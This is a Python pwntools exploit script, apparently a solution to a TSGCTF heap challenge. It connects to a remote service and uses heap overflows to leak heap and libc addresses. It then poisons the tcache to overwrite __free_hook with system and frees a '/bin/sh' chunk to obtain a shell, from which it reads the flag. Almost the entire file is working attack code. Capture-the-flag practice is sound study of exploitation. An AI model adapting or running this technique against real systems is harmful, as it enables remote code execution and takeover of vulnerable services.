from __future__ import division, print_function
import random
from pwn import *
import argparse
import time
import sys

context.log_level = 'error'

log = False
is_gaibu = True
host = sys.argv[1]
port = int(sys.argv[2])

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(verbose=True):
    s = r.recv()
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if log and verbose:
        print(s)
        pass
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice).encode("ascii"))

# receive and send
def rs(s, new_line=True, r=b':'):
    recvuntil(r)
    if type(s) != bytes:
        s = str(s).encode("ascii")
    if new_line:
        sendline(s)
    else:
        send(s)


def create(size, data):
    menu(1)
    rs(size)
    rs(data)

def show():
    menu(2)
    recvuntil(b' ')
    return recvline()

def remove():
    menu(3)


create(0x30, b"c")
remove()

create(0x40, b"b")
remove()

create(0x10, b"a")
remove()

create(0x20, b"b")
remove()

create(0x40, b"a" * 0x48 + p64(0x41))
wait_for_attach()
remove()

create(0x10, b"b")
remove()
heap_base = just_u64(show()) - 0x2a0
print(hex(heap_base))

create(0x10000, b"f")
create(0x10, b"g")


create(0x40, b"z" * 0x50 + p64(heap_base + 0x380))
create(0x30, b"h")
create(0x30, b"z")
remove()
libc_base = just_u64(show()) - 0x1ebbe0
print(hex(libc_base))


create(0x30, b"c")
remove()
create(0x40, b"b")
remove()

create(0x10, b"a")
remove()

create(0x20, b"b")
remove()

create(0x40, b"a" * 0x48 + p64(0x41))
remove()

wait_for_attach()
create(0x10, b"b")
remove()

free_hook = libc_base + 0x1eeb28
system = libc_base + 0x55410
create(0x40, b"z" * 0x50 + p64(free_hook))
create(0x30, b"h")
create(0x30, p64(system))

create(0x10, b"/bin/sh\x00")
remove()

r.sendline(b"cat flag; echo UOUO")
s = r.recvuntil(b"UOUO")

if b"TSGCTF" in s:
    print(s)
    exit(0)
else:
    exit(1)

interactive()

